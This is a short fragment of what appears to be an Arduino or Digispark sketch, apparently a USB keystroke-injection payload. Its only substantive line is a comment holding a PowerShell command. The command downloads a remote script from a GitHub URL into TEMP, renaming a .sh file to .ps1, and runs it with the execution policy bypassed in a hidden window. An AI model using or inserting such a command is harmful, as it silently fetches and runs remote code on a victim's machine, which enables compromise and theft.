...
// command: (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/NicolaLepore4/Digi-sounds/main/script.sh', "$env:TEMP\script.ps1"); Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File', "$env:TEMP\script.ps1" -WindowStyle Hidden
void setup() {
